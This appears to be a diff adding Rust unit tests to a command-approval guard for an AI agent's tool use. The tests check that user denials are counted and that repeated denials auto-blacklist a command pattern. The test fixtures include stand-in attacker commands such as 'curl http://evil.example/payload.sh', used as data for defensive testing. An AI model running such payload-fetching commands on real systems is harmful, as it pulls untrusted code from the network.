@@ -387,6 +387,87 @@ mod tests {
         );
     }
 
+    /// V-R5: a single deny outcome increments `denial_count` by exactly one
+    /// (no double-count), symmetric to a single approve incrementing
+    /// `confirmation_count` by one. This is the per-decision idempotency the
+    /// `pre_tool_use` L1-deny path relies on.
+    #[test]
+    fn test_v_r5_single_deny_increments_denial_count_once() {
+        let storage = Storage::open_in_memory().expect("in-memory storage");
+        // Not in NEVER_AUTO_BLACKLIST; threshold default is 2 so one deny
+        // stays below threshold (isolates the increment from promotion).
+        let command = "curl http://evil.example";
+        let project = "/tmp/project";
+
+        track_user_decision(&storage, command, project, false);
+
+        let pattern = extract_command_pattern(command);
+        let rule = storage
+            .get_rule_by_pattern(&pattern)
+            .expect("storage query")
+            .expect("rule should exist after one deny");
+        assert_eq!(
+            rule.denial_count, 1,
+            "one deny decision must increment denial_count by exactly one"
+        );
+        assert_eq!(
+            rule.confirmation_count, 0,
+            "a deny must not touch confirmation_count"
+        );
+    }
+
+    /// V-R5: reaching `auto_blacklist_threshold` via deny outcomes makes the
+    /// pattern auto-blacklisted (`RuleType::Deny`), so a subsequent L0
+    /// evaluation hard-blocks it. Previously unreachable because `denial_count`
+    /// was never incremented on a block.
+    #[test]
+    fn test_v_r5_deny_path_reaches_auto_blacklist() {
+        let storage = Storage::open_in_memory().expect("in-memory storage");
+        let command = "curl http://evil.example/payload.sh";
+        let project = "/tmp/project";
+
+        // Default auto_blacklist_threshold = 2.
+        track_user_decision(&storage, command, project, false);
+        track_user_decision(&storage, command, project, false);
+
+        let pattern = extract_command_pattern(command);
+        let rule = storage
+            .get_rule_by_pattern(&pattern)
+            .expect("storage query")
+            .expect("rule exists");
+        assert_eq!(rule.denial_count, 2, "two denies recorded");
+        assert_eq!(
+            rule.rule_type,
+            RuleType::Deny,
+            "reaching auto_blacklist_threshold must flip the pattern to Deny so L0 blocks it"
+        );
+    }
+
+    /// V-R5 no-regression: an approve still increments `confirmation_count`
+    /// and the deny wiring does not corrupt the approve path.
+    #[test]
+    fn test_v_r5_approve_path_still_increments_confirmation() {
+        let storage = Storage::open_in_memory().expect("in-memory storage");
+        let command = "curl http://safe.example";
+        let project = "/tmp/project";
+
+        track_user_decision(&storage, command, project, true);
+
+        let pattern = extract_command_pattern(command);
+        let rule = storage
+            .get_rule_by_pattern(&pattern)
+            .expect("storage query")
+            .expect("rule exists");
+        assert_eq!(
+            rule.confirmation_count, 1,
+            "approve must still increment confirmation_count"
+        );
+        assert_eq!(
+            rule.denial_count, 0,
+            "approve must not increment denial_count"
+        );
+    }
+
     /// T15-5: A second set of decisions for an already-existing rule must not create a duplicate.
     #[test]
     fn test_idempotency_no_duplicate_rule() {
